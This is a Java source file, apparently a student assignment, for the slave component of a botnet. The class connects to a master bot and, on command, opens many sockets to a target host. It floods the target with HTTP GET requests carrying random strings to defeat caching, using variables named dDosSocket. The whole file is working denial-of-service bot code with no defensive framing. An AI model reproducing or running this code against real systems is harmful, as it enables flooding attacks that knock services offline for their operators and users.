import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintStream;
import java.io.PrintWriter;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.Random;
import java.util.Scanner;
import java.util.concurrent.ThreadLocalRandom;

public class SlaveBot1 extends Thread {

	private int slaveId;
	private String timestamp = "";

	private int port;
	private Socket slaveSocket;
	private Socket threadSlaveSocket;
	private String ip;
	static int count = 1;
	static ArrayList<Socket> lstOfSocketsCreatedBySlave = new ArrayList<>();
	static HashMap<String, ArrayList<Socket>> mapOfSlaveSocketwithRemote = new HashMap<String, ArrayList<Socket>>();
	// private static ArrayList<SlaveBot> lstOfSlaveBots = new ArrayList<>();
	// static HashMap<String, String> mapOfSlaveObjecttoSocketwithMaster = new
	// HashMap<String, String>();

	public static void main(String[] args) {
		try {
			if(args.length!=0){
				String tempMasterAddress = args[1];
				int tempPortOfMaster = Integer.parseInt(args[2]);
				SlaveBot1 s = new SlaveBot1(tempPortOfMaster,tempMasterAddress);
				s.connectToMaster(s);
			}
			while (true) {
				Scanner inp = new Scanner(System.in);
				String line = inp.nextLine();
				// -h ip port
				String[] arrayOfString = line.split("\\s+");
				String serverName = arrayOfString[1];
				int port = Integer.parseInt(arrayOfString[2]);
				SlaveBot1 slave = new SlaveBot1(port, serverName);
				slave.connectToMaster(slave);
				/*
				 * if(!lstOfSlaveBots.isEmpty()){
				 * System.out.println("printing slavebot object content");
				 * for(SlaveBot s: lstOfSlaveBots){
				 * System.out.println(s.getSlaveId()+"size of con."+
				 * s.getLstOfSlaveBots().size()+"slavesocket"+s.
				 * getLstOfSlaveBots().get(0).getLstOfSlaveBots().get(0).
				 * getSlaveId()); } }
				 */
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	// default constructor
	public SlaveBot1() {

	}

	// constructor
	public SlaveBot1(int port, String ip) {
		this.port = port;
		this.ip = ip;
	}

	// connect to masterbot
	public void connectToMaster(SlaveBot1 slave) {

		Date date = new Date();
		try {
			SlaveBot1 slaveBot = slave;
			Socket temp = slaveBot.getSlaveSocket();
			temp = new Socket(slaveBot.getIp(), slaveBot.getPort());
			// slaveSocket = new Socket(slave.getIp(), slave.getPort());

			slaveBot.slaveId = count;
			slaveBot.setTimestamp("" + new SimpleDateFormat("yyyy-mm-dd").format(date));
			// slaveBot.getLstOfSlaveBots().add(slaveBot);
			count++;
			// mapOfSlaveObjecttoSocketwithMaster.put(String.valueOf(temp.getLocalSocketAddress()),
			// ""+new SimpleDateFormat("yyyy-mm-dd").format(date));
			// MasterBot.setTempMapOfSlaveObjecttoSocketwithMaster(mapOfSlaveObjecttoSocketwithMaster);
			System.out.println("Connected to " + temp.getRemoteSocketAddress() + " local socket add"
					+ temp.getLocalSocketAddress());
		} catch (IOException e) {
			// e.printStackTrace();
			System.out.println("-1");
		}
	}

	// connect to remote host:: called from master with ip address and port
	@SuppressWarnings("deprecation")
	public HashMap<String, ArrayList<Socket>> connectToRemoteHost(int port, String ip, Socket slave, int noOfConn,
			boolean keepAlive, String url) {

		ArrayList<Socket> lstOfSlaveSocketsStoredInMap = new ArrayList<>();
		try {

			for (int i = 0; i < noOfConn; i++) {
				Socket dDosSocket = new Socket();
				dDosSocket.connect(new InetSocketAddress(ip, port));
				if (dDosSocket.isConnected()) {
					System.out.println("Connected to " + dDosSocket.toString() + " with slave " + slave.toString());
					// keep alive and URL options go here, actual url wil be
					// send in run method
					if (keepAlive) {
						dDosSocket.setKeepAlive(true);
						System.out.println("keepAlive = true");
					}
					if (url != "" && url != null) {
						DataOutputStream os = new DataOutputStream(dDosSocket.getOutputStream());
						DataInputStream is = new DataInputStream(dDosSocket.getInputStream());
						// os.writeBytes("GET /#q=sjsu HTTP/1.1\n\n");
						os.writeBytes("GET " + url + SlaveBot1.getRandomString() + "HTTP/1.1\n\nHost: "+ip);
						// os.println("GET "+ ip+SlaveBot.getRandomString()+"
						// HTTP/1.1");
						// out.println();
						os.flush();
						System.out.println(is.readLine() + " random string used " + url + SlaveBot1.getRandomString());
						/*
						 * while ((inputLine = in.readLine()) != null) {
						 * count++; System.out.println(count);
						 * System.out.println(inputLine); }
						 */
						is.close();
					}
					lstOfSocketsCreatedBySlave.add(dDosSocket);
					lstOfSlaveSocketsStoredInMap.add(dDosSocket);
					for (String key : mapOfSlaveSocketwithRemote.keySet()) {
						if (key.equalsIgnoreCase(slave.getRemoteSocketAddress().toString())) {
							if (mapOfSlaveSocketwithRemote.containsValue(lstOfSlaveSocketsStoredInMap)
									|| mapOfSlaveSocketwithRemote.get(key) != null) {
								lstOfSlaveSocketsStoredInMap = mapOfSlaveSocketwithRemote.get(key);
							} else {
								lstOfSlaveSocketsStoredInMap = new ArrayList<>();
							}
							lstOfSlaveSocketsStoredInMap.add(dDosSocket);
						}
					}
					// mapOfSlaveSocketwithRemote.put(slave.getRemoteSocketAddress().toString(),
					// dDosSocket);
				}
			}
			mapOfSlaveSocketwithRemote.put(slave.getRemoteSocketAddress().toString(), lstOfSlaveSocketsStoredInMap);
			// start thread here

		} catch (IOException e) {
			e.printStackTrace();
		}
		return mapOfSlaveSocketwithRemote;
	}

	public void disconnectFromRemoteHost(int targetPort, String targetAddress, Socket slave) {
		int count = 0;
		boolean Arrow = true;
		try {
			/*
			 * for(int i = 0; i < lstOfSocketsCreatedBySlave.size(); i++){
			 * if(!lstOfSocketsCreatedBySlave.get(i).isClosed()){
			 * System.out.println("cccccccc");
			 * lstOfSocketsCreatedBySlave.get(i).close(); } }
			 */
			if (!slave.isClosed() || slave.isConnected()) {
				System.out.println("Disconnecting " + slave.toString());
				slave.close();
				// System.out.println("Disconnected");
			}

		} catch (IOException e) {
			e.printStackTrace();
		}

	}

	public void disconnectFromRemoteHost(int targetPort, String targetAddress, Socket slave, String temptargetPort) {
		int count = 0;
		boolean Arrow = true;
		try {
			/*
			 * for(int i = 0; i < lstOfSocketsCreatedBySlave.size(); i++) {
			 * 
			 * if(!lstOfSocketsCreatedBySlave.get(i).isClosed()) {
			 * System.out.println("cccccccc");
			 * lstOfSocketsCreatedBySlave.get(i).close();
			 * 
			 * }
			 * 
			 * }
			 */
			if (!slave.isClosed()) {
				System.out.println("Disconnecting " + slave.toString());
				slave.close();
				// System.out.println("Disconnected");
			}

		} catch (IOException e) {
			e.printStackTrace();
		}

	}

	public static String getRandomString() {
		/*
		 * String temp = "Computer"; for(int i=48;i<86;i++){ int j
		 * =ThreadLocalRandom.current().nextInt(i, 126); temp =
		 * String.valueOf(Character.toChars(j)); temp= temp +
		 * String.valueOf(Character.toChars(j+1)); temp= temp +
		 * String.valueOf(Character.toChars(j+2)); temp= temp +
		 * String.valueOf(Character.toChars(j+3)); //System.out.println(url); }
		 */

		Random ran = new Random();
		int top = ran.nextInt(9) + 1;
		char data = ' ';
		String dat = "";

		for (int i = 0; i <= top; i++) {
			data = (char) (ran.nextInt(25) + 97);
			dat = data +dat;
		}
		dat=dat+"2";
		// System.out.println(dat);
		return dat;
	}

	public int getSlaveId() {
		return slaveId;
	}

	public void setSlaveId(int slaveId) {
		this.slaveId = slaveId;
	}

	public int getPort() {
		return port;
	}

	public void setPort(int port) {
		this.port = port;
	}

	public String getIp() {
		return ip;
	}

	public void setIp(String ip) {
		this.ip = ip;
	}

	/*
	 * public ArrayList<SlaveBot> getLstOfSlaveBots() { return lstOfSlaveBots; }
	 * public void setLstOfSlaveBots(ArrayList<SlaveBot> lstOfSlaveBots) {
	 * this.lstOfSlaveBots = lstOfSlaveBots; }
	 */
	public Socket getSlaveSocket() {
		return slaveSocket;
	}

	public void setSlaveSocket(Socket slaveSocket) {
		this.slaveSocket = slaveSocket;
	}

	public String getTimestamp() {
		return timestamp;
	}

	public void setTimestamp(String timestamp) {
		this.timestamp = timestamp;
	}

	public static int getCount() {
		return count;
	}

	public static void setCount(int count) {
		SlaveBot1.count = count;
	}

	public static ArrayList<Socket> getLstOfSocketsCreatedBySlave() {
		return lstOfSocketsCreatedBySlave;
	}

	public static void setLstOfSocketsCreatedBySlave(ArrayList<Socket> lstOfSocketsCreatedBySlave) {
		SlaveBot1.lstOfSocketsCreatedBySlave = lstOfSocketsCreatedBySlave;
	}

}
